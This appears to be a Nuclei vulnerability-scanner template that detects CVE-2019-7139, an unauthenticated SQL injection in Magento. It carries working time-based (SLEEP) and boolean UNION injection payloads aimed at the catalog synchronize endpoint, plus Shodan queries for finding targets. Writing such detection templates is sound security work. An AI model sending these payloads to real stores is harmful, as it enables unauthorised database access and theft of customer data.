flow: http(1) && http(2)
http:
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "text/x-magento-init")
    internal: true
    type: dsl
  max-redirects: 2
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - duration_1>=8
    - contains(content_type_1, "application/json")
    name: time-based
    type: dsl
  - condition: and
    dsl:
    - contains(content_type_2, "application/json") && contains(content_type_3, "application/json")
    - status_code_2 == 200 && status_code_3 == 400
    - len(body_2) == 2 && len(body_3) == 2
    name: blind-based
    type: dsl
  raw:
  - '@timeout: 20s

    GET /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=?&ids[0][product_id][to]=)))+OR+(SELECT*FROM+(SELECT+SLEEP((8)))a)%3d1+--+-
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=?&ids[0][product_id][to]=)))%20OR%20(SELECT%201%20UNION%20SELECT%202%20FROM%20DUAL%20WHERE%201=0)%20--%20-
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=?&ids[0][product_id][to]=)))%20OR%20(SELECT%201%20UNION%20SELECT%202%20FROM%20DUAL%20WHERE%201=1)%20--%20-
    HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: CVE-2019-7139
info:
  author: MaStErChO
  classification:
    cpe: cpe:2.3:a:magento:magento:*:*:*:*:open_source:*:*:*
    cve-id: CVE-2019-7139
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.98174
    epss-score: 0.59912
  description: 'An unauthenticated user can execute SQL statements that allow arbitrary
    read access to the underlying database, which causes sensitive data leakage.

    '
  impact: 'Unauthenticated attackers can execute SQL injection to extract sensitive
    database contents including customer information, payment details, and administrative
    credentials, potentially leading to complete store compromise.

    '
  metadata:
    framework: magento
    max-request: 4
    product: magento
    shodan-query:
    - http.component:"Magento"
    - cpe:"cpe:2.3:a:magento:magento"
    - http.component:"magento"
    vendor: magento
    verified: true
  name: Magento - SQL Injection
  reference:
  - https://pentest-tools.com/blog/exploiting-sql-injection-in-magento-with-sqlmap
  - https://www.ambionics.io/blog/magento-sqli
  - https://magento.com/security/patches/magento-2.3.2-2.2.9-and-2.1.18-security-update-13
  - https://github.com/koutto/jok3r-pocs
  - https://nvd.nist.gov/vuln/detail/CVE-2019-7139
  remediation: 'This issue is fixed in Magento 2.1 prior to 2.1.18, Magento 2.2 prior
    to 2.2.9, Magento 2.3 prior to 2.3.2.

    '
  severity: critical
  tags: time-based-sqli,cve,cve2019,sqli,magento,vkev,vuln
